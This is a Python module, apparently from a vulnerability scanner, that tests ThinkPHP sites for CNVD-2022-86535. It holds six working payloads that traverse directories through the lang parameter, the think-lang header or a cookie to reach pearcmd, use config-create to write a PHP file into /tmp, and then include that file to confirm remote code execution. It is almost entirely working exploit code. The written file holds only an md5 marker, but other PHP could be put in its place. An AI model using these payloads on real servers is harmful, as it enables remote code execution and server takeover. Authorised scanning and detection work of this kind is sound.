#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5, random_int_1

baseHeaders = config.get('headers')

if baseHeaders.get('Cookie'):
    cookie_payload = 'think_lang=../../../../../../../../usr/local/lib/php/pearcmd'
    new_cookie = baseHeaders.get('Cookie') + '; ' + cookie_payload
else:
    new_cookie = 'think_lang=../../../../../../../../usr/local/lib/php/pearcmd'

cnvd_2022_86535_payloads = [
    {
        'path-1': 'index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=md5({NUM})?>+/tmp/{FILENAME}.php',
        'headers-1': {},
        'path-2': 'index.php?lang=../../../../../../../../tmp/{FILENAME}',
    },
    {
        'path-1': 'public/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=md5({NUM})?>+/tmp/{FILENAME}.php',
        'headers-1': {},
        'path-2': 'public/index.php?lang=../../../../../../../../tmp/{FILENAME}',
    },
    {
        'path-1': 'index.php?+config-create+/<?=md5({NUM})?>+/tmp/{FILENAME}.php',
        'headers-1': {'think-lang': '../../../../../../../../usr/local/lib/php/pearcmd'},
        'path-2': 'index.php?lang=../../../../../../../../tmp/{FILENAME}',
    },
    {
        'path-1': 'public/index.php?+config-create+/<?=md5({NUM})?>+/tmp/{FILENAME}.php',
        'headers-1': {'think-lang': '../../../../../../../../usr/local/lib/php/pearcmd'},
        'path-2': 'public/index.php?lang=../../../../../../../../tmp/{FILENAME}',
    },
    {
        'path-1': 'index.php?+config-create+/<?=md5({NUM})?>+/tmp/{FILENAME}.php',
        'headers-1': {'Cookie': new_cookie},
        'path-2': 'index.php?lang=../../../../../../../../tmp/{FILENAME}',
    },
    {
        'path-1': 'public/index.php?+config-create+/<?=md5({NUM})?>+/tmp/{FILENAME}.php',
        'headers-1': {'Cookie': new_cookie},
        'path-2': 'public/index.php?lang=../../../../../../../../tmp/{FILENAME}',
    },
]

def cnvd_2022_86535_scan(self, clients):
    ''' 如果 Thinkphp 程序开启了多语言功能, 
            攻击者可以通过 get、header、cookie 等位置传入参数, 实现目录穿越+文件包含, 
            通过pearcmd文件包含这个trick即可实现RCE
        v6.0.1 < Thinkphp < v6.0.13,
        Thinkphp v5.0.x,
        Thinkphp v5.1.x,
    '''
    hackClient = clients.get('hackClient')

    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'RCE',
        'vul_id': 'CNVD-2022-86535',
    }

    for payload in cnvd_2022_86535_payloads:
        randomNum = random_int_1(6)
        randomFileName = random_md5()

        path_1 = payload['path-1'].format(NUM=randomNum, FILENAME=randomFileName)
        headers_1 = payload['headers-1']
        path_2 = payload['path-2'].format(FILENAME=randomFileName)

        res1 = hackClient.request(
            'get',
            path_1,
            headers=headers_1,
            vul_info=vul_info
        )
        if res1 is None:
            continue

        res2 = hackClient.request(
            'get',
            path_2,
            vul_info=vul_info
        )
        if res2 is None:
            continue

        md = md5(str(randomNum), 32)
        if (md in res2.text):
            results = {
                'Target': res2.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request-1': res1,
                'Request-2': res2,
            }
            return results
    return None